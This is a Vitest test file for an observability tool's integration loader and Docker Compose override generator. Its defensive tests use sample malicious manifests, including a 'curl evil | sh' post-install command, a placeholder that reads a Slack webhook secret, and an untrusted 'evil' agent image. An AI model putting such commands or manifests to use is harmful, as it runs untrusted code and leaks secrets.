import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { parse } from 'yaml';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  builtinRegistry,
  CODES,
  composeOverride,
  connectService,
  IntegrationLoadError,
  IntegrationRegistry,
  interpolate,
  loadWorkspace,
  shellExports,
  validateSources,
} from '../src/index.js';

const examples = join(import.meta.dirname, '..', '..', '..', 'examples');

function workspace(spec: string) {
  return validateSources([
    {
      path: 'raion.yaml',
      content: `apiVersion: raion/v1alpha1\nkind: Workspace\nmetadata:\n  name: acme\nspec:\n${spec}`,
    },
  ]);
}

describe('built-in integrations', () => {
  it('loads and validates every first-party package', () => {
    const registry = builtinRegistry();
    expect(registry.names()).toContain('nodejs');
    const nodejs = registry.get('nodejs')!;
    expect(nodejs.docs).toContain('# Node.js');
    expect(nodejs.manifest.spec.capabilities.map((c) => c.id)).toContain('http.server');
  });

  it('is chosen automatically from the service language', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      language: nodejs\n',
    );
    const svc = result.workspace!.services[0]!;
    expect(svc.integrations).toEqual([
      {
        name: 'nodejs',
        version: '0.1.0',
        params: { injectAgent: false, esmHook: true },
        implicit: true,
      },
    ]);
    expect(svc.capabilities.map((c) => c.id)).toEqual([
      'http.server',
      'http.client',
      'logs.otlp',
      'traces.otlp',
      'runtime.nodejs',
    ]);
  });

  it('gives services without a known language no capabilities', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      language: php\n',
    );
    expect(result.workspace!.services[0]!.capabilities).toEqual([]);
  });
});

describe('integration validation', () => {
  it('rejects unknown integrations with a suggestion', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      integrations: [nodjs]\n',
    );
    expect(result.diagnostics[0]).toMatchObject({
      code: CODES.UNKNOWN_INTEGRATION,
      hint: 'did you mean "nodejs"?',
    });
  });

  it('rejects unknown and mistyped parameters', () => {
    const unknown = workspace(
      '  services:\n    - name: api\n      type: api\n      integrations: [{ name: nodejs, params: { esm: true } }]\n',
    );
    expect(unknown.diagnostics[0]).toMatchObject({
      code: CODES.INVALID_INTEGRATION_PARAMS,
      hint: 'parameters: injectAgent, esmHook',
    });
    const typed = workspace(
      '  services:\n    - name: api\n      type: api\n      integrations: [{ name: nodejs, params: { esmHook: "yes" } }]\n',
    );
    expect(typed.diagnostics[0]!.message).toBe('parameter "esmHook" must be true or false');
  });

  it('warns when an integration does not match the service language', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      language: go\n      integrations: [nodejs]\n',
    );
    expect(result.ok).toBe(true);
    expect(result.diagnostics.map((d) => d.code)).toEqual([CODES.INTEGRATION_LANGUAGE_MISMATCH]);
  });

  it('requires latency thresholds to match a histogram bucket', () => {
    const result = workspace(
      '  level: 3\n  services:\n    - name: api\n      type: api\n      language: nodejs\n      slos:\n        - name: fast\n          sli: { type: latency, thresholdMs: 450 }\n          target: 99\n',
    );
    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({
      code: CODES.LATENCY_THRESHOLD_NOT_BUCKET,
      line: 12,
      hint: 'use 500 or 250 for thresholdMs; a threshold between buckets cannot be measured exactly',
    });
    const ok = workspace(
      '  level: 3\n  services:\n    - name: api\n      type: api\n      language: nodejs\n      slos:\n        - name: fast\n          sli: { type: latency, thresholdMs: 500 }\n          target: 99\n',
    );
    expect(ok.diagnostics).toEqual([]);
  });

  it('warns that SLOs cannot be evaluated without HTTP metrics', () => {
    const result = workspace(
      '  level: 3\n  services:\n    - name: api\n      type: api\n      language: php\n      slos:\n        - name: a\n          sli: { type: availability }\n          target: 99\n',
    );
    expect(result.ok).toBe(true);
    expect(result.diagnostics.map((d) => d.code)).toEqual([CODES.SLO_WITHOUT_HTTP_METRICS]);
  });
});

describe('untrusted integration packages', () => {
  let dir: string;
  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'raion-int-'));
  });
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  async function pkg(name: string, manifest: string) {
    await mkdir(join(dir, name));
    await writeFile(join(dir, name, 'integration.yaml'), manifest);
  }

  const header = (env: string) => `apiVersion: raion/v1alpha1
kind: Integration
metadata: { name: evil, version: 0.0.1 }
spec:
  kind: application
  displayName: Evil
  description: test
  instrumentation:
    env:
${env}
  docs: README.md
`;

  it('rejects placeholders outside the allowed set', async () => {
    await pkg('evil', header('      STEAL: ${secret.SLACK_WEBHOOK}'));
    expect(() => IntegrationRegistry.fromDirectory(dir)).toThrow(
      /unknown placeholder \$\{secret\.SLACK_WEBHOOK\}/,
    );
  });

  it('rejects fields the schema does not allow, such as commands', async () => {
    await pkg(
      'evil',
      header('      A: b').replace(
        '  docs: README.md',
        '  postInstall: "curl evil | sh"\n  docs: README.md',
      ),
    );
    expect(() => IntegrationRegistry.fromDirectory(dir)).toThrow(IntegrationLoadError);
  });

  it('never leaves an unknown placeholder in output', () => {
    expect(() => interpolate('x ${nope}', {} as never)).toThrow(/unknown placeholder/);
  });
});

describe('connecting services', () => {
  it('generates a Compose override for the example application', async () => {
    const result = await loadWorkspace(join(examples, 'nodejs-express', 'observability'));
    expect(result.diagnostics).toEqual([]);
    const ws = result.workspace!;
    const connections = ws.services.map((s) => connectService(ws, s));
    const override = composeOverride(ws, connections);
    await expect(override).toMatchFileSnapshot(
      join('__golden__', 'nodejs-express', 'observability.override.yaml.txt'),
    );

    const parsed = parse(override) as {
      services: Record<
        string,
        { environment: Record<string, string>; networks: Record<string, unknown> }
      >;
      networks: Record<string, { external: boolean; name: string }>;
    };
    const env = parsed.services['payment-api']!.environment;
    expect(env.OTEL_SERVICE_NAME).toBe('payment-api');
    expect(env.OTEL_EXPORTER_OTLP_ENDPOINT).toBe('http://otel-collector:4318');
    expect(env.OTEL_RESOURCE_ATTRIBUTES).toBe(
      'service.namespace=payments-demo,deployment.environment.name=production',
    );
    expect(env.OTEL_TRACES_EXPORTER).toBe('otlp');
    expect(env.NODE_OPTIONS).toContain("register('@opentelemetry/instrumentation/hook.mjs'");
    expect(Object.keys(parsed.services['payment-api']!.networks)).toEqual([
      'default',
      'raion-ingest',
    ]);
    expect(parsed.networks['raion-ingest']).toEqual({ external: true, name: 'raion-ingest' });
  });

  it('points host processes at the loopback OTLP port and turns off tracing below level 2', () => {
    const result = workspace(
      '  level: 1\n  services:\n    - name: api\n      type: api\n      language: nodejs\n      runtime: { type: host }\n      integrations: [{ name: nodejs, params: { esmHook: false } }]\n',
    );
    const ws = result.workspace!;
    const c = connectService(ws, ws.services[0]!);
    const env = Object.fromEntries(c.env);
    expect(env.OTEL_EXPORTER_OTLP_ENDPOINT).toBe('http://127.0.0.1:4318');
    expect(env.OTEL_TRACES_EXPORTER).toBe('none');
    expect(env.NODE_OPTIONS).toBe('--require=@opentelemetry/auto-instrumentations-node/register');
    expect(c.notes.some((n) => n.includes('Tracing is off'))).toBe(true);
    expect(composeOverride(ws, [c])).toContain('services: {}');
  });

  it('quotes shell exports safely', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      language: nodejs\n      runtime: { type: host }\n',
    );
    const ws = result.workspace!;
    const shell = shellExports(connectService(ws, ws.services[0]!));
    expect(shell).toContain(
      `export NODE_OPTIONS='--import=data:text/javascript,import{register}from'\\''node:module'\\''`,
    );
  });

  it('explains when a service cannot be connected automatically yet', () => {
    const result = workspace(
      '  services:\n    - name: api\n      type: api\n      language: php\n',
    );
    const ws = result.workspace!;
    const c = connectService(ws, ws.services[0]!);
    expect(c.supported).toBe(false);
    expect(c.notes[0]).toContain('Raion has no php integration');
  });
});

describe('adding the agent when the container starts', () => {
  const ws = (services: string) => {
    const r = validateSources([
      {
        path: 'raion.yaml',
        content: `apiVersion: raion/v1alpha1\nkind: Workspace\nmetadata:\n  name: t\nspec:\n  level: 2\n  services:\n${services}`,
      },
    ]);
    if (!r.workspace) throw new Error(JSON.stringify(r.diagnostics));
    return r.workspace;
  };

  it('needs no change to the image: a helper copies the pinned agent into a shared volume', () => {
    const w = ws(
      '    - name: shop\n      type: api\n      integrations:\n        - name: nodejs\n          params: { injectAgent: true }\n',
    );
    const c = connectService(w, w.services[0]!);
    expect(c.requirements).toEqual([]);
    expect(c.agent).toMatchObject({ name: 'nodejs', path: '/autoinstrumentation/.' });
    expect(c.agent!.image).toMatch(
      /^ghcr\.io\/open-telemetry\/opentelemetry-operator\/autoinstrumentation-nodejs:0\.78\.0@sha256:[0-9a-f]{64}$/,
    );
    expect(Object.fromEntries(c.env).NODE_OPTIONS).toBe(
      '--require /otel-auto-instrumentation/autoinstrumentation.js',
    );

    const override = parse(composeOverride(w, [c])) as {
      services: Record<string, Record<string, unknown>>;
      volumes: Record<string, unknown>;
    };
    expect(override.services['raion-agent-shop']).toMatchObject({
      command: ['cp', '-r', '/autoinstrumentation/.', '/otel-auto-instrumentation/'],
      volumes: ['raion-agent-shop:/otel-auto-instrumentation'],
      network_mode: 'none',
      read_only: true,
      cap_drop: ['ALL'],
      restart: 'no',
    });
    expect(override.services.shop).toMatchObject({
      depends_on: { 'raion-agent-shop': { condition: 'service_completed_successfully' } },
      volumes: ['raion-agent-shop:/otel-auto-instrumentation:ro'],
    });
    expect(override.volumes).toEqual({ 'raion-agent-shop': {} });
  });

  it('is the default for Java, picks the Alpine build of the Python agent, and is Compose only', () => {
    const w = ws(
      [
        '    - name: billing\n      type: api\n      language: java\n',
        '    - name: worker\n      type: worker\n      integrations:\n        - name: python\n          params: { injectAgent: true, alpine: true }\n',
        '    - name: host-app\n      type: api\n      runtime: { type: host }\n      integrations:\n        - name: nodejs\n          params: { injectAgent: true }\n',
      ].join(''),
    );
    const of = (name: string) =>
      connectService(
        w,
        w.services.find((s) => s.name === name)!,
      );
    const [java, python, host] = [of('billing'), of('worker'), of('host-app')];
    expect(Object.fromEntries(java.env).JAVA_TOOL_OPTIONS).toBe(
      '-javaagent:/otel-auto-instrumentation/javaagent.jar',
    );
    expect(java.agent?.path).toBe('/javaagent.jar');
    expect(python.agent?.path).toBe('/autoinstrumentation-musl/.');
    expect(Object.fromEntries(python.env).PYTHONPATH).toContain('/otel-auto-instrumentation');
    expect(python.requirements).toEqual([]);
    expect(host.agent).toBeUndefined();
    expect(host.notes.join(' ')).toMatch(/only works in Docker Compose/);
  });

  it('only lets a package choose among the agents Raion pins', () => {
    const files = [
      {
        path: 'raion.yaml',
        content:
          'apiVersion: raion/v1alpha1\nkind: Workspace\nmetadata:\n  name: t\nspec:\n  services:\n    - name: shop\n      type: api\n      integrations: [evil]\n',
      },
      {
        path: 'integrations/evil/integration.yaml',
        content:
          'apiVersion: raion/v1alpha1\nkind: Integration\nmetadata:\n  name: evil\n  version: 1.0.0\nspec:\n  kind: application\n  displayName: Evil\n  description: x\n  instrumentation:\n    env: {}\n    agent:\n      image: docker.io/evil/agent:latest\n      path: /x\n  docs: README.md\n',
      },
      { path: 'integrations/evil/README.md', content: '# x\n' },
    ];
    const result = validateSources(files);
    expect(result.workspace).toBeUndefined();
    expect(JSON.stringify(result.diagnostics)).toMatch(/nodejs|python|java/);
  });
});
